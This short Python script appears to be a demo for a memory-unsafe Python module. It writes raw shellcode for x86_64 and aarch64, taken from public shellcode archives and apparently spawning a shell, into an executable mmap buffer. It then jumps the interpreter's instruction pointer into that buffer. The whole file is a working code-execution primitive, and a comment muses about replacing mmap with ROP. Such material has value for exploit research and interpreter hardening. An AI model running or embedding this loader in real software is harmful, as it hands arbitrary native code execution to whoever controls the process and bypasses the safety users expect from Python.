# Note: last tested on aarch64 py2.7, py3.8 - py3.11

import unsafe
import platform
import mmap
# TODO: I consider mmap to be cheating. I would like to write a shellcode
# loader that does not depend on the mmap library (e.g. using ROP to map the RWX buffer)

mem = unsafe.getmem()

shellcodes = {}
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcodes["x86_64"] = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# https://www.exploit-db.com/exploits/47048
shellcodes["aarch64"] = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

shellcode = shellcodes[platform.machine()]

mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC)
mm.write(shellcode)

mm_addr = unsafe.addrof(mm)
shellcode_addr = unsafe.u64(mem[mm_addr+16:mm_addr+16+8])

print(hex(id(unsafe.setrip(shellcode_addr))))
